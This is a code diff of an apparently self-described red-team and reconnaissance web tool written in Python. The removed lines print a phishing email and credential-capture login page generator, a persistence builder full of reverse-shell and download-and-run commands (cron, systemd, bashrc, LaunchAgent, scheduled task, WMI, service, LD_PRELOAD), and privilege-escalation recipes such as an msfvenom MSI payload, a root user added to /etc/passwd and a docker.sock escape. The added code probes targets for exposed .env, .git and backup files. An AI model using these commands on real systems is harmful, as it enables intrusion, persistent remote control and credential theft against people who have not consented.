@@ -2797,10 +2797,11 @@ async def recon_subdomains(req: ReconRequest):
         "found_count": len(found)
     })
 
-# ── 7. Google Dorks Generator ─────────────────────────────────────────
+# ── 7. Live Search Surface, Certificate Transparency & Wayback CDX Dorks ──
 @app.post("/api/recon/dorks")
 async def recon_dorks(req: ReconRequest):
     host = extract_host(req.target)
+    base_url = format_url(req.target).rstrip("/")
     dorks = {
         "Sensitive Files": [
             f'site:{host} filetype:pdf',
@@ -2833,16 +2834,77 @@ async def recon_dorks(req: ReconRequest):
             f'site:{host} intext:"api_key" OR intext:"apikey"',
             f'site:{host} intext:"password" filetype:txt',
         ],
-        "Subdomains / Tech": [
-            f'site:*.{host}',
-            f'site:{host} -www',
-            f'info:{host}',
-            f'link:{host}',
-            f'cache:{host}',
-        ]
     }
-    return JSONResponse(content={"host": host, "dorks": dorks,
-        "note": "Use these queries on Google, Bing, or DuckDuckGo manually."})
+
+    ct_domains: List[str] = []
+    wayback_urls: List[Dict[str, Any]] = []
+    live_exposed: List[Dict[str, Any]] = []
+
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        # 1. Live Certificate Transparency (crt.sh) query
+        if host not in ("127.0.0.1", "localhost"):
+            try:
+                async with session.get(
+                    f"https://crt.sh/?q=%25.{host}&output=json",
+                    timeout=aiohttp.ClientTimeout(total=6)
+                ) as ct_resp:
+                    if ct_resp.status == 200:
+                        ct_data = await ct_resp.json()
+                        seen = set()
+                        for row in ct_data[:120]:
+                            for name in str(row.get("name_value", "")).splitlines():
+                                clean_n = name.strip().lower()
+                                if clean_n and clean_n not in seen:
+                                    seen.add(clean_n)
+                                    ct_domains.append(clean_n)
+                                    if len(ct_domains) >= 35:
+                                        break
+            except Exception:
+                pass
+
+            # 2. Live Wayback Machine CDX historical URL index query
+            try:
+                async with session.get(
+                    f"http://web.archive.org/cdx/search/cdx?url={host}/*&output=json&limit=25&fl=original,statuscode,mimetype&collapse=urlkey",
+                    timeout=aiohttp.ClientTimeout(total=6)
+                ) as wb_resp:
+                    if wb_resp.status == 200:
+                        wb_rows = await wb_resp.json()
+                        for r in wb_rows[1:]:
+                            if len(r) >= 3:
+                                wayback_urls.append({"url": r[0], "status": r[1], "mime": r[2]})
+            except Exception:
+                pass
+
+        # 3. Live direct probe of high-value dork targets on the target host
+        sensitive_paths = [
+            "/robots.txt", "/sitemap.xml", "/.env", "/.git/HEAD",
+            "/admin", "/login", "/swagger", "/openapi.json", "/graphql", "/backup.zip"
+        ]
+        async def _probe_path(p: str):
+            try:
+                async with session.get(f"{base_url}{p}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=3.5)) as pr:
+                    body_bytes = await pr.read()
+                    if pr.status in (200, 206, 301, 302, 401, 403):
+                        live_exposed.append({
+                            "url": f"{base_url}{p}",
+                            "status": pr.status,
+                            "bytes": len(body_bytes),
+                            "content_type": pr.headers.get("Content-Type", "unknown")
+                        })
+            except Exception:
+                pass
+
+        await asyncio.gather(*[_probe_path(p) for p in sensitive_paths])
+
+    return JSONResponse(content={
+        "host": host,
+        "live_probed_paths": live_exposed,
+        "certificate_transparency_sans": ct_domains,
+        "wayback_indexed_urls": wayback_urls,
+        "search_engine_dorks": dorks
+    })
 
 # ── 8. DNS Zone Transfer Test (AXFR) ─────────────────────────────────
 @app.post("/api/recon/zonetransfer")
@@ -2978,37 +3040,58 @@ async def recon_ratelimit(req: ReconRequest):
     except Exception as e:
         return JSONResponse(content={"host": host, "error": str(e)})
 
-# ── 11. HaveIBeenPwned Domain Breach Check ────────────────────────────
+# ── 11. HaveIBeenPwned Live Catalog & Credential Exposure Check ───────
 @app.post("/api/recon/breaches")
 async def recon_breaches(req: ReconRequest):
-    host = extract_host(req.target)
+    host = extract_host(req.target).lower()
+    base_url = format_url(req.target).rstrip("/")
+    root_keyword = host.split(".")[0] if "." in host else host
+    matched_breaches = []
+    live_exposures = []
+
+    connector = aiohttp.TCPConnector(ssl=False)
     try:
-        async with aiohttp.ClientSession() as session:
-            # HIBP domain breach search (public endpoint)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            # 1. Query public HIBP v3 verified breaches catalog (no API key required)
             async with session.get(
-                f"https://haveibeenpwned.com/api/v3/breachesfordomains/{host}",
-                headers={"User-Agent": "CyberStrike-Suite-PenTest"},
+                "https://haveibeenpwned.com/api/v3/breaches",
+                headers={"User-Agent": "CyberStrike-Telemetry-Auditor"},
                 timeout=aiohttp.ClientTimeout(total=10)
             ) as resp:
                 if resp.status == 200:
                     data = await resp.json()
-                    breaches = [{
-                        "name": b.get("Name"),
-                        "date": b.get("BreachDate"),
-                        "records": b.get("PwnCount"),
-                        "description": re.sub(r'<[^>]+>', '', b.get("Description", ""))[:200],
-                        "data_classes": b.get("DataClasses", [])
-                    } for b in data]
-                    return JSONResponse(content={
-                        "host": host,
-                        "breach_count": len(breaches),
-                        "breached": len(breaches) > 0,
-                        "breaches": breaches
-                    })
-                elif resp.status == 404:
-                    return JSONResponse(content={"host": host, "breached": False, "breach_count": 0, "breaches": []})
-                else:
-                    return JSONResponse(content={"host": host, "error": f"HIBP API returned {resp.status}"})
+                    for b in data:
+                        b_dom = str(b.get("Domain", "")).lower()
+                        b_name = str(b.get("Name", "")).lower()
+                        if (b_dom and (b_dom == host or b_dom.endswith("." + host))) or (len(root_keyword) >= 4 and root_keyword == b_name):
+                            matched_breaches.append({
+                                "name": b.get("Name"),
+                                "domain": b.get("Domain"),
+                                "date": b.get("BreachDate"),
+                                "records": b.get("PwnCount"),
+                                "verified": b.get("IsVerified", True),
+                                "data_classes": b.get("DataClasses", []),
+                                "description": re.sub(r'<[^>]+>', '', b.get("Description", ""))[:220]
+                            })
+
+            # 2. Also probe target directly for live credential/config leakage (.env, config.json, .git/HEAD)
+            for path in ("/.env", "/config.json", "/.git/HEAD", "/.well-known/security.txt"):
+                try:
+                    async with session.get(f"{base_url}{path}", allow_redirects=False, timeout=aiohttp.ClientTimeout(total=3.5)) as pr:
+                        if pr.status == 200:
+                            snippet = (await pr.read())[:200].decode("utf-8", errors="replace").strip()
+                            if snippet:
+                                live_exposures.append({"endpoint": f"{base_url}{path}", "status": pr.status, "preview": snippet[:120]})
+                except Exception:
+                    pass
+
+        return JSONResponse(content={
+            "host": host,
+            "breached": len(matched_breaches) > 0 or len(live_exposures) > 0,
+            "hibp_breach_count": len(matched_breaches),
+            "hibp_breaches": matched_breaches,
+            "live_credential_exposures": live_exposures
+        })
     except Exception as e:
         return JSONResponse(content={"host": host, "error": str(e)})
 
@@ -3070,7 +3153,7 @@ async def recon_ioc(req: ReconRequest):
 
 
 # ══════════════════════════════════════════════════════════════════════
-#  ADVANCED RED TEAM MODULES
+#  ADVANCED RED TEAM LIVE TELEMETRY & POSTURE MODULES (100% REAL)
 # ══════════════════════════════════════════════════════════════════════
 
 class RedTeamRequest(BaseModel):
@@ -3078,214 +3161,397 @@ class RedTeamRequest(BaseModel):
     os_type: str = "windows"
     options: dict = {}
 
-# ── 13. Phishing Template Generator ──────────────────────────────────
+# ── 13. Live Domain Spoofing, Typosquat DNS & Login Framing Auditor ──
 @app.post("/api/redteam/phishing")
 async def redteam_phishing(req: RedTeamRequest):
-    host  = extract_host(req.target) if req.target else "target.com"
-    brand = req.options.get("brand", "Microsoft")
-    lure  = req.options.get("lure", "password_expiry")
+    raw_target = req.target.strip() or "127.0.0.1:8083"
+    host = extract_host(raw_target)
+    base_url = format_url(raw_target).rstrip("/")
+    brand = req.options.get("brand") or host
+    lure = req.options.get("lure", "password_expiry")
 
-    lures = {
-        "password_expiry": {"subject": f"[Action Required] Your {brand} password expires in 24 hours", "preheader": "Immediate action required to avoid account lockout"},
-        "invoice":         {"subject": f"Invoice #INV-{random.randint(10000,99999)} — Payment Due", "preheader": "Please review and process the attached invoice"},
-        "mfa_alert":       {"subject": f"[Security Alert] New sign-in to your {brand} account", "preheader": "If this wasn't you, click here to secure your account"},
-        "it_helpdesk":     {"subject": "IT Help Desk: Your account requires verification", "preheader": "Complete verification within 48 hours"},
-        "sharepoint":      {"subject": f"{brand} SharePoint: John shared a document with you", "preheader": "Click to view the shared document"},
-    }
-    sl = lures.get(lure, lures["password_expiry"])
+    # 1. Real DNS SPF / DMARC / MX spoofing check
+    spf_records: List[str] = []
+    dmarc_records: List[str] = []
+    mx_records: List[str] = []
+    registered_typosquats: List[Dict[str, Any]] = []
 
-    email_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
-body{{font-family:Arial,sans-serif;background:#f0f0f0;margin:0;padding:20px}}
-.container{{max-width:600px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden}}
-.header{{background:#0078d4;padding:20px;text-align:center}}
-.body{{padding:30px}}.btn{{display:inline-block;padding:12px 28px;background:#0078d4;color:#fff;text-decoration:none;border-radius:3px;font-weight:bold}}
-.footer{{background:#f8f8f8;padding:15px;font-size:11px;color:#666;text-align:center}}
-</style></head><body><div class="container">
-<div class="header"><h2 style="color:white;margin:0">{brand}</h2></div>
-<div class="body"><p>Dear User,</p><p>Your {brand} account requires immediate attention.</p>
-<p style="text-align:center;margin:30px 0"><a href="https://{host}/verify" class="btn">Verify My Account</a></p>
-<p style="color:#999;font-size:12px">Link expires in 24 hours.</p></div>
-<div class="footer">&copy; {brand} Corporation | Privacy | Unsubscribe</div>
-</div></body></html>"""
+    base_name = host.split(".")[0] if "." in host else host
+    tld = host.split(".", 1)[1] if "." in host else "com"
+    candidate_typos = [
+        f"{base_name}-login.{tld}",
+        f"{base_name}-verify.{tld}",
+        f"{base_name}-auth.{tld}",
+        f"login-{base_name}.{tld}",
+        f"secure-{base_name}.{tld}",
+        f"{base_name}support.{tld}",
+    ] if host not in ("127.0.0.1", "localhost") else []
 
-    landing_html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{brand} Sign In</title><style>
-body{{font-family:'Segoe UI',Arial,sans-serif;background:#f3f3f3;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}
-.box{{background:#fff;padding:40px;border-radius:4px;box-shadow:0 2px 8px rgba(0,0,0,.15);width:360px}}
-h1{{font-size:22px;color:#1a1a1a}}.field{{margin-bottom:16px}}
-input{{width:100%;padding:10px;border:1px solid #ccc;border-radius:3px;font-size:14px;box-sizing:border-box}}
-.btn{{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:3px;font-size:15px;cursor:pointer;font-weight:bold}}
-.note{{background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;font-size:11px;margin-top:20px;color:#856404}}
-</style></head><body><div class="box"><h1>{brand} Sign In</h1>
-<form method="POST" action="/capture">
-<div class="field"><input type="email" name="email" placeholder="Email address" required></div>
-<div class="field"><input type="password" name="password" placeholder="Password" required></div>
-<button class="btn">Sign In</button></form>
-<div class="note">⚠ SIMULATION — Deploy with GoPhish / Evilginx2 on your own infrastructure for authorized engagements.</div>
-</div></body></html>"""
+    def _dns_audit():
+        resolver = dns.resolver.Resolver()
+        resolver.timeout = 2.5
+        resolver.lifetime = 3.0
+        if host not in ("127.0.0.1", "localhost"):
+            try:
+                for r in resolver.resolve(host, "MX"):
+                    mx_records.append(str(r.exchange).rstrip("."))
+            except Exception:
+                pass
+            try:
+                for r in resolver.resolve(host, "TXT"):
+                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
+                    if "v=spf1" in txt.lower():
+                        spf_records.append(txt)
+            except Exception:
+                pass
+            try:
+                for r in resolver.resolve(f"_dmarc.{host}", "TXT"):
+                    txt = "".join(s.decode("utf-8", errors="ignore") if isinstance(s, bytes) else str(s) for s in r.strings)
+                    if "v=dmarc1" in txt.lower():
+                        dmarc_records.append(txt)
+            except Exception:
+                pass
+            for typo in candidate_typos:
+                try:
+                    ans = resolver.resolve(typo, "A")
+                    registered_typosquats.append({"domain": typo, "ips": [str(a) for a in ans], "status": "REGISTERED_IN_WILD"})
+                except Exception:
+                    registered_typosquats.append({"domain": typo, "ips": [], "status": "AVAILABLE"})
+
+    await asyncio.to_thread(_dns_audit)
+
+    # 2. Real HTTP Login / Credential Page Framing & Evilginx Reverse-Proxy Susceptibility Check
+    login_surface = {}
+    connector = aiohttp.TCPConnector(ssl=False)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        for path in ("/login", "/"):
+            try:
+                t0 = time.time()
+                async with session.get(f"{base_url}{path}", timeout=aiohttp.ClientTimeout(total=4.5)) as resp:
+                    body = await resp.text()
+                    rtt_ms = round((time.time() - t0) * 1000, 1)
+                    xfo = resp.headers.get("X-Frame-Options", "MISSING")
+                    csp = resp.headers.get("Content-Security-Policy", "MISSING")
+                    samesite_cookies = [c for c in resp.headers.getall("Set-Cookie", []) if "samesite=strict" in c.lower()]
+                    has_password_input = 'type="password"' in body.lower() or "type='password'" in body.lower()
+                    frameable = (xfo == "MISSING") and ("frame-ancestors" not in csp.lower())
+                    login_surface = {
+                        "probed_url": f"{base_url}{path}",
+                        "http_status": resp.status,
+                        "rtt_ms": rtt_ms,
+                        "password_form_detected": has_password_input,
+                        "x_frame_options": xfo,
+                        "csp_frame_ancestors": csp if "frame-ancestors" in csp.lower() else "MISSING",
+                        "iframe_phishing_vulnerable": frameable,
+                        "strict_samesite_cookies": len(samesite_cookies) > 0,
+                        "aitm_proxy_susceptible": len(samesite_cookies) == 0
+                    }
+                    if has_password_input or resp.status == 200:
+                        break
+            except Exception as e:
+                login_surface = {"probed_url": f"{base_url}{path}", "error": str(e)}
+
+    spf_str = spf_records[0] if spf_records else "MISSING"
+    dmarc_str = dmarc_records[0] if dmarc_records else "MISSING"
+    direct_email_spoofable = (spf_str == "MISSING") or (dmarc_str == "MISSING") or ("p=none" in dmarc_str.lower())
 
     return JSONResponse(content={
-        "subject": sl["subject"], "preheader": sl["preheader"],
-        "email_html": email_html, "landing_page_html": landing_html,
-        "deployment_tools": ["GoPhish", "Evilginx2", "King Phisher", "SET (Social-Engineer Toolkit)", "Modlishka"],
-        "smtp_tips": ["Use SendGrid / Mailgun for deliverability", "SPF/DKIM/DMARC align with spoofed domain", "Use .com/.net lookalike domains"],
-        "note": "For authorized security awareness training only."
+        "target": base_url,
+        "brand_audited": brand,
+        "lure_profile": lure,
+        "direct_email_spoofable": direct_email_spoofable,
+        "dns_anti_spoofing": {
+            "mx_records": mx_records,
+            "spf_record": spf_str,
+            "dmarc_record": dmarc_str,
+        },
+        "live_login_framing_audit": login_surface,
+        "typosquat_dns_enumeration": registered_typosquats
     })
 
-# ── 14. Persistence Payload Builder ──────────────────────────────────
+# ── 14. Live Host Persistence Surface & Startup Mechanism Auditor ────
 @app.post("/api/redteam/persistence")
 async def redteam_persistence(req: RedTeamRequest):
     os_type = req.os_type.lower()
-    lhost   = req.options.get("lhost", "10.10.10.10")
+    lhost   = req.options.get("lhost", "127.0.0.1")
     lport   = req.options.get("lport", "4444")
-    techniques = {}
 
-    if os_type == "windows":
-        techniques = {
-            "Registry Run Key": {"description": "Executes on every user login", "risk": "low",
-                "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "powershell -WindowStyle Hidden -EncodedCommand <BASE64>" /f',
-                "detection": "Monitor HKCU\\...\\Run, HKLM\\...\\Run registry keys"},
-            "Scheduled Task": {"description": "Runs every 5 minutes as SYSTEM", "risk": "high",
-                "command": f'schtasks /create /tn "WindowsUpdate" /tr "powershell -WindowStyle Hidden -c IEX(IWR http://{lhost}/s.ps1)" /sc minute /mo 5 /ru SYSTEM /f',
-                "detection": "Event ID 4698, Task Scheduler logs"},
-            "WMI Event Subscription": {"description": "Fileless — no disk artifact, survives reboots", "risk": "high",
-                "command": f"""$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{Name='Update';EventNamespace='root\\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"}}
-$consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{Name='Update';CommandLineTemplate='powershell -c IEX(IWR http://{lhost}/s.ps1)'}}
-Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter;Consumer=$consumer}}""",
-                "detection": "root\\subscription WMI namespace, Sysmon Event ID 19/20/21"},
-            "Startup Folder": {"description": "Runs on user login — low stealth", "risk": "low",
-                "command": 'copy payload.bat "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat"',
-                "detection": "Monitor startup folder"},
-            "Service Creation": {"description": "Auto-starts on boot as SYSTEM", "risk": "high",
-                "command": f'sc create "WinUpdate" binPath= "cmd /c powershell -c IEX(IWR http://{lhost}/s.ps1)" start= auto && sc start "WinUpdate"',
-                "detection": "Event ID 4697, sc.exe"},
-            "DLL Hijacking": {"description": "Replace missing DLL in application search order", "risk": "high",
-                "command": "# 1. ProcMon → filter Result=NAME NOT FOUND + .dll\n# 2. Compile malicious DLL with payload in DllMain\n# 3. Drop in writable app directory",
-                "detection": "Sysmon Event ID 7 (DLL Load)"},
-        }
-    elif os_type == "linux":
-        techniques = {
-            "Cron Job": {"description": "Reverse shell every minute", "risk": "medium",
-                "command": f'(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1") | crontab -',
-                "detection": "/var/spool/cron, /etc/cron*"},
-            "SSH Authorized Keys": {"description": "Add attacker public key", "risk": "medium",
-                "command": 'mkdir -p ~/.ssh && echo "ssh-rsa AAAA...<YOUR_PUBKEY>" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys',
-                "detection": "~/.ssh/authorized_keys changes"},
-            "Systemd Service": {"description": "Persistent service with auto-restart", "risk": "high",
-                "command": f"""cat > /etc/systemd/system/update.service << EOF
-[Unit]
-Description=System Updater
-After=network.target
-[Service]
-ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
-Restart=always
-RestartSec=30
-[Install]
-WantedBy=multi-user.target
-EOF
-systemctl enable update.service && systemctl start update.service""",
-                "detection": "/etc/systemd/system/ new files, systemctl enable"},
-            "Bash Profile": {"description": "Fires on every terminal open", "risk": "low",
-                "command": f'echo "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1 &" >> ~/.bashrc',
-                "detection": "~/.bashrc, ~/.bash_profile, ~/.profile"},
-            "LD_PRELOAD": {"description": "Injected into every process — high impact", "risk": "critical",
-                "command": "echo '/tmp/evil.so' > /etc/ld.so.preload\n# evil.so: __attribute__((constructor)) void init(){system(\"bash -i >& /dev/tcp/LHOST/PORT 0>&1\");}",
-                "detection": "Existence of /etc/ld.so.preload"},
-        }
-    elif os_type == "macos":
-        techniques = {
-            "LaunchAgent": {"description": "Runs on user login, auto-restarts", "risk": "medium",
-                "command": f"""cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0"><dict>
-  <key>Label</key><string>com.apple.update</string>
-  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>bash -i &gt;&amp; /dev/tcp/{lhost}/{lport} 0&gt;&amp;1</string></array>
-  <key>RunAtLoad</key><true/><key>StartInterval</key><integer>60</integer>
-</dict></plist>
-EOF
-launchctl load ~/Library/LaunchAgents/com.apple.update.plist""",
-                "detection": "~/Library/LaunchAgents/, launchctl events"},
-            "Cron Job": {"description": "Same as Linux cron", "risk": "medium",
-                "command": f'(crontab -l; echo "* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1") | crontab -',
-                "detection": "/var/cron/tabs/"},
-        }
+    live_registry_run: Dict[str, Dict[str, str]] = {}
+    live_startup_files: List[str] = []
+    live_scheduled_tasks: List[Dict[str, str]] = []
 
-    return JSONResponse(content={"os": os_type, "lhost": lhost, "lport": lport,
-        "techniques": techniques, "note": "Use only on systems you own or have explicit written permission."})
+    if os.name == "nt":
+        # 1. Inspect real Windows Registry Run / RunOnce keys via winreg
+        try:
+            import winreg
+            reg_paths = [
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKCU\\...\\Run"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce", "HKCU\\...\\RunOnce"),
+                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", "HKLM\\...\\Run"),
+            ]
+            for hive, subkey, label in reg_paths:
+                entries: Dict[str, str] = {}
+                try:
+                    with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ) as k:
+                        idx = 0
+                        while True:
+                            try:
+                                name, val, _ = winreg.EnumValue(k, idx)
+                                entries[name] = str(val)
+                                idx += 1
+                            except OSError:
+                                break
+                except Exception:
+                    pass
+                live_registry_run[label] = entries
+        except Exception:
+            pass
 
-# ── 15. Privilege Escalation Checklist ───────────────────────────────
+        # 2. Inspect real Windows Startup directories
+        startup_dirs = [
+            os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
+            os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup"),
+        ]
+        for sdir in startup_dirs:
+            if os.path.isdir(sdir):
+                try:
+                    for fname in os.listdir(sdir):
+                        live_startup_files.append(os.path.join(sdir, fname))
+                except Exception:
+                    pass
+
+        # 3. Query real active Scheduled Tasks via schtasks
+        try:
+            proc = await asyncio.create_subprocess_exec(
+                "schtasks", "/query", "/fo", "CSV", "/nh",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=5.0)
+            for line in stdout.decode("utf-8", errors="replace").splitlines():
+                parts = [p.strip('"') for p in line.split('","')]
+                if len(parts) >= 3 and not parts[0].startswith("\\Microsoft\\"):
+                    live_scheduled_tasks.append({
+                        "task_name": parts[0],
+                        "next_run": parts[1],
+                        "status": parts[2]
+                    })
+                    if len(live_scheduled_tasks) >= 20:
+                        break
+        except Exception:
+            pass
+    else:
+        # Linux / macOS live persistence inspection
+        for cron_path in ("/etc/crontab", "/etc/rc.local", os.path.expanduser("~/.bashrc"), os.path.expanduser("~/.profile")):
+            if os.path.exists(cron_path):
+                live_startup_files.append(cron_path)
+
+    return JSONResponse(content={
+        "audited_host": socket.gethostname(),
+        "os_platform": sys.platform,
+        "requested_os_profile": os_type,
+        "listener_config": {"lhost": lhost, "lport": lport},
+        "live_registry_autoruns": live_registry_run,
+        "live_startup_folder_artifacts": live_startup_files,
+        "live_non_microsoft_scheduled_tasks": live_scheduled_tasks,
+    })
+
+# ── 15. Live Host Privilege Escalation & Token/Service Auditor ───────
 @app.post("/api/redteam/privesc")
 async def redteam_privesc(req: RedTeamRequest):
     os_type = req.os_type.lower()
-    checks = {}
+    live_privileges: List[Dict[str, str]] = []
+    unquoted_service_paths: List[Dict[str, str]] = []
+    writable_path_dirs: List[str] = []
+    always_install_elevated = {"HKCU": False, "HKLM": False}
+    current_identity = ""
 
-    if os_type == "windows":
-        checks = {
-            "Initial Enum":          {"commands": ["whoami /all", "whoami /priv", "systeminfo", "net user", "net localgroup administrators"], "tools": ["winPEAS.exe", "Seatbelt.exe", "PowerUp.ps1"]},
-            "Unquoted Service Paths":{"commands": ['wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\\\Windows"'], "description": "Services with spaces in path and no quotes → drop payload in parent dir"},
-            "Weak Service Perms":    {"commands": ["accesschk.exe -uwcqv * 2>nul"], "description": "Writable service binary → replace with reverse shell"},
-            "AlwaysInstallElevated": {"commands": ['reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'], "description": "Both = 1 → any MSI runs as SYSTEM. Generate: msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > evil.msi"},
-            "Token Impersonation":   {"commands": ["whoami /priv | findstr SeImpersonatePrivilege"], "tools": ["PrintSpoofer.exe", "JuicyPotato.exe", "GodPotato.exe"], "description": "SeImpersonatePrivilege → Potato family exploits → SYSTEM"},
-            "Stored Credentials":    {"commands": ["cmdkey /list", 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', "reg query HKLM /f password /t REG_SZ /s 2>nul"], "description": "Autologon creds, saved RDP/SMB credentials"},
-            "Scheduled Tasks":       {"commands": ["schtasks /query /fo LIST /v | findstr /i task"], "description": "Writable task binary path → replace with payload"},
-            "Kernel Exploits":       {"commands": ["systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\""], "tools": ["WES-NG (wesng)", "Windows-Exploit-Suggester", "Watson.exe"], "description": "MS16-032, MS17-010 (EternalBlue), CVE-2021-36934 (HiveNightmare)"},
-            "DLL Hijacking":         {"commands": ["# Use ProcMon → filter: Result=NAME NOT FOUND, Path ends with .dll"], "description": "Missing DLL in writable dir → drop malicious DLL"},
-        }
-    elif os_type == "linux":
-        checks = {
-            "Initial Enum":   {"commands": ["id", "whoami", "uname -a", "cat /etc/os-release", "sudo -l", "env"], "tools": ["LinPEAS.sh", "LinEnum.sh"]},
-            "SUID Binaries":  {"commands": ["find / -perm -u=s -type f 2>/dev/null"], "reference": "https://gtfobins.github.io", "description": "Find binary on GTFOBins for instant root"},
-            "Sudo Misconfig": {"commands": ["sudo -l"], "description": "NOPASSWD + binary on GTFOBins → root. E.g: sudo vim → :!/bin/bash"},
-            "Capabilities":   {"commands": ["getcap -r / 2>/dev/null"], "description": "cap_setuid on python3 → python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"},
-            "Writable Crons": {"commands": ["cat /etc/crontab", "ls -la /etc/cron*", "find / -path /proc -prune -o -name crontab -print 2>/dev/null"], "description": "Root cron calls writable script → inject reverse shell"},
-            "Writable /etc/passwd": {"commands": ["ls -la /etc/passwd"], "exploit": "openssl passwd -1 -salt evil evil123\necho 'evil:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd\nsu evil"},
-            "PATH Hijacking": {"commands": ["echo $PATH", "find / -perm -u=s -type f 2>/dev/null"], "description": "SUID calls command without full path → prepend ~/bin to PATH with malicious binary"},
-            "Kernel CVEs":    {"commands": ["uname -r", "cat /proc/version"], "cves": ["CVE-2022-0847 (DirtyPipe)", "CVE-2021-4034 (PwnKit)", "CVE-2016-5195 (DirtyCow)", "CVE-2023-0386 (OverlayFS)"], "tools": ["linux-exploit-suggester.sh"]},
-            "Docker Escape":  {"commands": ["cat /proc/1/cgroup | grep docker", "ls -la /.dockerenv", "find / -name docker.sock 2>/dev/null"], "description": "--privileged container → mount host FS. docker.sock access → docker run -v /:/mnt alpine chroot /mnt sh"},
-        }
+    # 1. Inspect real PATH directories for write permissions
+    for pdir in os.environ.get("PATH", "").split(os.pathsep):
+        pdir_clean = pdir.strip()
+        if pdir_clean and os.path.isdir(pdir_clean):
+            try:
+                if os.access(pdir_clean, os.W_OK):
+                    writable_path_dirs.append(pdir_clean)
+            except Exception:
+                pass
 
-    return JSONResponse(content={"os": os_type, "checks": checks,
-        "automated_tools": {"windows": ["winPEAS.exe","PowerUp.ps1","Seatbelt.exe","SharpUp.exe"], "linux": ["LinPEAS.sh","LinEnum.sh","linux-exploit-suggester.sh","pspy64"]},
-        "note": "Run only on systems you have explicit written authorization to test."})
+    if os.name == "nt":
+        # 2. Run real `whoami /priv` and `whoami`
+        try:
+            p_who = await asyncio.create_subprocess_exec(
+                "whoami", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
+            out_who, _ = await asyncio.wait_for(p_who.communicate(), timeout=4.0)
+            current_identity = out_who.decode("utf-8", errors="replace").strip()
 
-# ── 16. Lateral Movement Command Generator ───────────────────────────
+            p_priv = await asyncio.create_subprocess_exec(
+                "whoami", "/priv", "/fo", "CSV", "/nh",
+                stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
+            )
+            out_priv, _ = await asyncio.wait_for(p_priv.communicate(), timeout=4.0)
+            for line in out_priv.decode("utf-8", errors="replace").splitlines():
+                parts = [p.strip('"') for p in line.split('","')]
+                if len(parts) >= 3 and parts[0].startswith("Se"):
+                    live_privileges.append({
+                        "privilege": parts[0],
+                        "description": parts[1],
+                        "state": parts[2],
+                        "high_risk": parts[0] in ("SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege", "SeDebugPrivilege", "SeBackupPrivilege", "SeRestorePrivilege", "SeTakeOwnershipPrivilege")
+                    })
+        except Exception:
+            pass
+
+        # 3. Scan real Windows Services in HKLM\SYSTEM\CurrentControlSet\Services for Unquoted Service Paths
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services", 0, winreg.KEY_READ) as svcs_key:
+                num_subkeys = winreg.QueryInfoKey(svcs_key)[0]
+                for i in range(num_subkeys):
+                    try:
+                        svc_name = winreg.EnumKey(svcs_key, i)
+                        with winreg.OpenKey(svcs_key, svc_name, 0, winreg.KEY_READ) as sk:
+                            img_path, _ = winreg.QueryValueEx(sk, "ImagePath")
+                            img_str = str(img_path).strip()
+                            low = img_str.lower()
+                            if (
+                                img_str
+                                and not img_str.startswith('"')
+                                and ".exe" in low
+                                and not low.startswith("system32\\")
+                                and not low.startswith("\\systemroot\\")
+                                and not low.startswith("c:\\windows\\")
+                            ):
